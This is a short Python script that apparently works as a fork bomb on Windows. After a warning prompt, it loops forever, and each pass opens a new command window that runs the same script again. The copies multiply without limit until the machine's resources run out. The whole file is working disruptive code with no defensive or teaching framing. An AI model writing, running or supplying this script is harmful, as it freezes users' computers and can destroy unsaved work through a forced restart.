import subprocess
if input("Warning: Once run, this program cannot be stopped.\nTo continue, press enter.\nTo exit, type 'exit'.").lower() == "exit":
    exit()
while True:
    subprocess.run(f'start cmd /k python "{__file__}"', shell=True)